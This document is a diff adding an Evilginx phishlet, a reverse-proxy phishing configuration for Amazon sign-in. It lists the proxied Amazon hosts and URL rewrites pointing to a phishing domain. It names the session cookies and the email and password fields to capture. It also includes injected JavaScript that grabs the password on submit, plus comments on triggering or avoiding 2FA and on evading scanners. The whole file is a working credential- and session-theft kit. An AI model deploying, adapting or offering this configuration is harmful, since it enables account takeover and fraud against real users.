@@ -1,0 +1,124 @@
+author: '@Evi1Grey5'
+min_ver: '3.0.0'
+
+proxy_hosts:
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'amazon.com', session: true, is_landing: true, auto_filter: false}
+  - {phish_sub: '', orig_sub: '', domain: 'amazon.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'c', orig_sub: 'c', domain: 'amazon-adsystem.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 's', orig_sub: 's', domain: 'amazon-adsystem.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'images-na', orig_sub: 'images-na', domain: 'ssl-images-amazon.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'm', orig_sub: 'm', domain: 'media-amazon.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'unagi', orig_sub: 'unagi', domain: 'amazon.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'unagi-na', orig_sub: 'unagi-na', domain: 'amazon.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'fls-na', orig_sub: 'fls-na', domain: 'amazon.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'static', orig_sub: 'static', domain: 'siege-amazon.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: '', orig_sub: '', domain: 'prod.USAmazon', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'mbdvgoj27h.execute-api.us-east-1', orig_sub: 'mbdvgoj27h.execute-api.us-east-1', domain: 'amazonaws.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'fls-na', orig_sub: 'fls-na', domain: 'amazon.com', session: true, is_landing: false, auto_filter: false}
+
+sub_filters:
+  - {triggers_on: 'www.amazon.com', orig_sub: 'www', domain: 'amazon.com', search: 'https://{hostname}', replace: 'https://{hostname}:443', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.amazon.com', orig_sub: 'www', domain: 'amazon.com', search: 'prod.USAmazon', replace: 'adownoe.online', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'images-na.ssl-images-amazon.com', orig_sub: 'images-na', domain: 'ssl-images-amazon.com', search: '.amazon.com/1/events/', replace: '.adownoe.online/1/events/', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'unagi.amazon.com', orig_sub: 'unagi', domain: 'amazon.com', search: 'https://mbdvgoj27h.execute-api.us-east-1.amazonaws.com/prod/v1/log', replace: 'https://mbdvgoj27h.execute-api.us-east-1.amazon.evilginx.com/prod/v1/log', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'static.siege-amazon.com', orig_sub: 'static', domain: 'siege-amazon.com', search: 'https://{hostname}/prod/profiles/AuthenticationPortalSigninNA.js', replace: 'https://{hostname}:443/prod/profiles/AuthenticationPortalSigninNA.js', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+
+
+#auth_tokens:
+#  - domain: '.amazon.com'
+#    keys: ['.*:regexp']
+#    type: 'cookie'
+#  - domain: 'amazon.com'
+#    keys: ['.*:regexp']
+#    type: 'cookie'
+#  - domain: 'www.amazon.com'
+#    keys: ['.*:regexp']
+#    type: 'cookie'
+
+# Amazon's cookie name is static, that is, the cookie name remains the same in each login process, then in the authorization URL, find the cookie name in the response, and fill in authentic_tokens.
+auth_tokens:
+  - domain: '.amazon.com'
+    keys: ['session-id', 'session-id-time', 'session-token', 'at-main', 'i18n-prefs', 'lc-main', 'sess-at-main', 'sst-main', 'ubid-main', 'x-main']
+    type: 'cookie'
+  - domain: 'amazon.com'
+    keys: ['session-id', 'session-id-time', 'session-token', 'at-main', 'i18n-prefs', 'lc-main', 'sess-at-main', 'sst-main', 'ubid-main', 'x-main']
+    type: 'cookie'
+  - domain: 'www.amazon.com'
+    keys: ['session-id', 'session-id-time', 'session-token', 'at-main', 'i18n-prefs', 'lc-main', 'sess-at-main', 'sst-main', 'ubid-main', 'x-main']
+    type: 'cookie'
+
+auth_urls:
+  - '/ap/.*'
+  - '/ap/mfa*'
+  - '/'
+
+credentials:
+  username:
+    key: 'email'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'password'
+    search: '(.*)'
+    type: 'post'
+
+login:
+  domain: 'www.amazon.com'
+  path: '/ap/signin?openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fwww.amazon.com%2F%3Fref_%3Dnav_signin&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.assoc_handle=usflex&openid.mode=checkid_setup&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0'
+
+force_post:
+  - path: '/ap/signin'
+    search:
+      - {key: 'email', search: '.*'}
+      - {key: 'password', search: '.*'}
+    force:
+      - {key: 'rememberMe', value: 'true'}
+    type: 'post'
+
+js_inject:
+  - trigger_domains: ["www.amazon.com"]
+    trigger_paths: ["/ap/signin"]
+    trigger_params: ["email"]
+    script: |
+      document.addEventListener('DOMContentLoaded', function() {
+        function lp(){
+          var email = document.querySelector("#ap_email");
+          if (email != null) {
+            email.value = "{email}";
+            return;
+          }
+        }
+        lp();
+      });
+
+  - trigger_domains: ["www.amazon.com"]
+    trigger_paths: ["/ap/signin", "/signin"]
+    trigger_params: ["password"]
+    script: |  
+      function onclickListener(){
+        var submit = document.querySelectorAll('input[type="submit"]')[0];
+        submit.setAttribute("onclick", "sendPass()");
+        submit.addEventListener("click", sendPass);
+        return;
+      }
+      function sendPass(){
+        var password = document.getElementsByName("password")[0].value;
+        var xhr = new XMLHttpRequest();
+        xhr.open("POST", '/capture-password', true);
+        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+        xhr.send("unenc_password="+encodeURIComponent(password));
+        return;
+      }
+      setTimeout(function(){ onclickListener(); }, 1000);
+
+# Local test 2fa trigger condition 1: IP remote replacement, that is, the first digit changes, 125.164.3.41 is changed to 180.253.166.70 will trigger 2fa, 125.164.10.49 is changed to 125.164.13.79 will not.
+# Local test 2fa trigger condition 2: A completely new device with fingerprint browser, changed from os to windows, Android, and chrome to firfox.
+# Remote test 2fa trigger condition 1: The proxy command configures the proxy IP of different countries to trigger 2fa.
+# Remote test 2fa trigger condition 2: A completely new device with fingerprint browser, changed from os to windows, Android, and chrome to firfox.
+
+# Find the authorization URL. The host group under this URL is the host participating in the login verification process.Hosts that do not participate in the login verification process do not need an agent.
+# The authorization URL is: the URL before the final URL after the complete login.
+# OTP input URL and account password input URL can all be authorization URL.
+# It should be noted that amazon will have dynamic hosts participating in the login process, such as s.amazon-adsystem.com , This host is the host responsible for advertising and is also a dynamic host, and will intervene in the login process from time to time. If you do not act as an agent, a 404 problem will occur.
+# For dynamic hosts, the solution is: test the phishing URL at any time to see if there is a problem. If so, first check whether the website has added a dynamic host.
+# In addition, the session in proxy_hosts is always set to true to solve the vulnerability of the online scanner scanning to malicious hosts through the evilginx host name.
